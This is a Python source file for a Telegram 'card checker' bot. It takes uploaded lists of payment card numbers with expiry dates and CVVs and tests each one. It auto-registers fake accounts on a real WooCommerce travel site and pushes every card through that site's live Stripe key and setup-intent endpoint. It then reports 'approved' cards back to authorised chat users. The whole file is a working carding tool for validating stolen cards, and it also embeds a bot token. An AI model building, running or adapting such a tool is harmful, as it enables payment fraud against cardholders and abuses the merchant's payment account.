from datetime import datetime, timedelta
import io
import os
import random
import re
import string
import threading
import time
from bs4 import BeautifulSoup
import requests
import telebot

TELEGRAM_BOT_TOKEN = "8664861867:AAF5Wq79aekFKDcE6vFT2jFO_3w4jjFgLmk"
SECRET_CODE = "Zenmods123"
authorized_users = set()

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="Markdown")
print_lock = threading.Lock()

anasxzer00 = f"""
Join Channel for new updates.
"""

def mc_tools():
    banner = anasxzer00
    print_red(banner)

def by_anasxzer00(text):
    for char in text:
        print(f'\033[91m{char}\033[0m', end='', flush=True)
        time.sleep(0.03)
    print()

anasxzer00_best = ["requests", "bs4", "re", "json", "random", "string", "datetime"]

def print_line():
    print_red(f"""|-|==========================================|-|""")

def print_sline():
    print_cyan(f"""|----------------------------------------------|""")

def print_red(text): print(f"\033[91m{text}\033[0m")
def print_green(text): print(f"\033[92m{text}\033[0m")
def print_yellow(text): print(f"\033[93m{text}\033[0m")
def print_blue(text): print(f"\033[94m{text}\033[0m")
def print_magenta(text): print(f"\033[95m{text}\033[0m")
def print_cyan(text): print(f"\033[96m{text}\033[0m")
def print_white(text): print(f"\033[97m{text}\033[0m")
def print_grey(text): print(f"\033[90m{text}\033[0m")
def print_light_blue(text): print(f"\033[104m{text}\033[0m")
def print_light_cyan(text): print(f"\033[106m{text}\033[0m")
def print_light_grey(text): print(f"\033[47m{text}\033[0m")
def print_light_magenta(text): print(f"\033[105m{text}\033[0m")
def print_dark_blue(text): print(f"\033[34m{text}\033[0m")
def print_dark_magenta(text): print(f"\033[35m{text}\033[0m")
def print_dark_cyan(text): print(f"\033[36m{text}\033[0m")
def print_dark_grey(text): print(f"\033[90m{text}\033[0m")
def print_dark_green(text): print(f"\033[32m{text}\033[0m")
def print_dark_yellow(text): print(f"\033[33m{text}\033[0m")
def print_dark_red(text): print(f"\033[31m{text}\033[0m")
def print_bright_blue(text): print(f"\033[94m{text}\033[0m")
def print_bright_magenta(text): print(f"\033[95m{text}\033[0m")
def print_bright_cyan(text): print(f"\033[96m{text}\033[0m")
def print_bright_grey(text): print(f"\033[97m{text}\033[0m")
def print_bright_green(text): print(f"\033[92m{text}\033[0m")
def print_bright_yellow(text): print(f"\033[93m{text}\033[0m")
def print_bright_red(text): print(f"\033[91m{text}\033[0m")

def gggggggggggggggggg(length=9, domain=None):
    common_domains = ["gmail.com"]
    if not domain:
        domain = random.choice(common_domains)
    username_characters = string.ascii_letters + string.digits
    username = ''.join(random.choice(username_characters) for _ in range(length))
    return f"{username}@{domain}"

def create_session():
    try:
        session = requests.Session()
        email = gggggggggggggggggg()
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
        html = response.text
        soup = BeautifulSoup(html, 'html.parser')
        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']
        
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.thetravelinstitute.com',
            'referer': 'https://www.thetravelinstitute.com/register/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        data = [
            ('afurd_field_nonce', f'{nonce}'),
            ('_wp_http_referer', '/register/'),
            ('pre_page', ''),
            ('email', f'{email}'),
            ('password', 'rokyNoa5954J'),
            ('wc_order_attribution_source_type', 'typein'),
            ('wc_order_attribution_referrer', 'https://www.thetravelinstitute.com/my-account/payment-methods/'),
            ('wc_order_attribution_utm_campaign', '(none)'),
            ('wc_order_attribution_utm_source', '(direct)'),
            ('wc_order_attribution_utm_medium', '(none)'),
            ('wc_order_attribution_utm_content', '(none)'),
            ('wc_order_attribution_utm_id', '(none)'),
            ('wc_order_attribution_utm_term', '(none)'),
            ('wc_order_attribution_utm_source_platform', '(none)'),
            ('wc_order_attribution_utm_creative_format', '(none)'),
            ('wc_order_attribution_utm_marketing_tactic', '(none)'),
            ('wc_order_attribution_session_entry', 'https://www.thetravelinstitute.com/my-account/add-payment-method/'),
            ('wc_order_attribution_session_start_time', '2024-11-17 09:43:38'),
            ('wc_order_attribution_session_pages', '8'),
            ('wc_order_attribution_session_count', '1'),
            ('wc_order_attribution_user_agent', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'),
            ('woocommerce-register-nonce', f'{noncee}'),
            ('_wp_http_referer', '/register/'),
            ('register', 'Register'),
        ]
        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            return session
        else:
            return None
    except Exception as e:
        return None

def save_session_to_file(session, file_path):
    with open(file_path, "w") as file:
        cookies = session.cookies.get_dict()
        file.write(str(cookies))

def load_session_from_file(file_path):
    try:
        with open(file_path, "r") as file:
            session_data = file.read().strip()
            session = requests.Session()
            cookies = eval(session_data)
            session.cookies.update(cookies)
            return session
    except Exception as e:
        return None

def manage_session_file():
    session_file = "anasxzer00-session.txt"
    if os.path.exists(session_file):
        session = load_session_from_file(session_file)
        if session:
            return session
    session = create_session()
    if session:
        save_session_to_file(session, session_file)
        return session
    else:
        return None

def check_single_cc(cc_line, session):
    try:
        card = cc_line.replace('/', '|')
        lista = card.split("|")
        if len(lista) < 4:
            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nError: Invalid format"
        
        cc = lista[0]
        mm = lista[1]
        yy = lista[2]
        if "20" in yy:
            yy = yy.split("20")[1]
        cvv = lista[3]

        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://www.thetravelinstitute.com/my-account/payment-methods/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers, timeout=20)
        html = response.text
        nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html).group(1)
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.thetravelinstitute.com',
            'referer': 'https://www.thetravelinstitute.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-stripe-client-user-agent': '{"init_source":"elements-inner","plugin_name":"stripe.js","lang":"en","bindings_version":"2.20.0","os":"android","browser":"chrome"}',
        }
        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20)
        res = response.text
        iddd = ''
        
        if 'error' in res:
            error = response.json()['error']['message']
            if 'code' in error:
                return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nError: {error}"
            else:
                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nError: {error}"
        else:
            iddd = response.json()['id']
            headers = {
                'authority': 'www.thetravelinstitute.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.thetravelinstitute.com',
                'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            params = {
                'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            }
            data = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': iddd,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce,
            }
            response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data, timeout=20)
            res_json = response.json()
            if res_json['success'] == False:
                error = res_json['data']['error']['message']
                if 'code' in error:
                    return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nError: {error}"
                else:
                    return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nError: {error}"
            else:
                return f"ZENMODS CHECKER ⚡\nApproved ✅\n{card}\nStatus: Approved!"
    except Exception as e:
        return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nError: {str(e)}"

def process_bulk_file(chat_id, file_content):
    lines = [line.strip() for line in file_content.decode("utf-8").splitlines() if line.strip()]
    total_cards = len(lines)

    if total_cards == 0:
        bot.send_message(chat_id, "⚠️ File is empty or no cards found!")
        return

    msg = bot.send_message(chat_id, f"⚡ **Zenmods Advanced Engine** ⚡\nTotal cards found: `{total_cards}`.\n🚀 Initializing sequential checking...")
    msg_id = msg.message_id

    approved_count = 0
    ccn_count = 0
    declined_count = 0
    error_count = 0

    detailed_results = []
    session = manage_session_file()
    
    if not session:
        bot.send_message(chat_id, "❌ Session creation failed!")
        return

    for index, card_line in enumerate(lines, start=1):
        res = check_single_cc(card_line, session)
        detailed_results.append(res)
        
        if "Approved ✅" in res:
            approved_count += 1
            zenmods_animation = (
                "🌟✨💫 **Z E N M O D S   H I T !** 💫✨🌟\n"
                "🔥 *The anvil rings true, a legendary strike!* 🔥\n\n"
                f"{res}\n\n"
                "🎇🎆🎇🎆🎇🎆🎇🎆"
            )
            bot.send_message(chat_id, zenmods_animation)
        elif "CCN ✅" in res:
            ccn_count += 1
            bot.send_message(chat_id, res)
        elif "Declined ❌" in res:
            declined_count += 1
        else:
            error_count += 1

        if index % 3 == 0 or index == total_cards:
            progress_text = f"⚡ **Zenmods Advanced Engine** ⚡\nProgress: `[{index}/{total_cards}]` ({int((index/total_cards)*100)}%)\nProcessing cards sequentially..."
            try:
                bot.edit_message_text(progress_text, chat_id, msg_id)
            except Exception:
                pass

    report = f"📊 **ZENMODS ADVANCED CHECK REPORT** 📊\n\nTotal Checked: `{total_cards}`\nApproved ✅: `{approved_count}`\nCCN ✅: `{ccn_count}`\nDeclined ❌: `{declined_count}`\nErrors/Invalid: `{error_count}`\n\n🏁 Advanced checking completed successfully!"
    bot.send_message(chat_id, report)

    file_bytes = io.BytesIO("\n\n".join(detailed_results).encode("utf-8"))
    file_bytes.name = "Zenmods_Detailed_Stripe_Report.txt"
    bot.send_document(chat_id, file_bytes, caption="Zenmods Detailed Stripe Report")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome to Zenmods Checker Bot! Send /auth <code > to authorize or upload a text file with combos.")

@bot.message_handler(commands=['auth'])
def authorize_user(message):
    try:
        parts = message.text.split()
        if len(parts) > 1 and parts[1] == SECRET_CODE:
            authorized_users.add(message.chat.id)
            bot.reply_to(message, "✅ Authorization successful! You can now send card lists.")
        else:
            bot.reply_to(message, "❌ Invalid secret code!")
    except Exception as e:
        bot.reply_to(message, "⚠️ An error occurred.")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    chat_id = message.chat.id
    if chat_id not in authorized_users:
        bot.reply_to(message, "⛔ You are not authorized! Use `/auth <secret_code>` first.")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        process_bulk_file(chat_id, downloaded_file)
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error processing file: {str(e)}")

if __name__ == "__main__":
    mc_tools()
    print_line()
    by_anasxzer00(' -- Zenmods Telegram Bot Engine Initialized Successfully!')
    bot.infinity_polling()
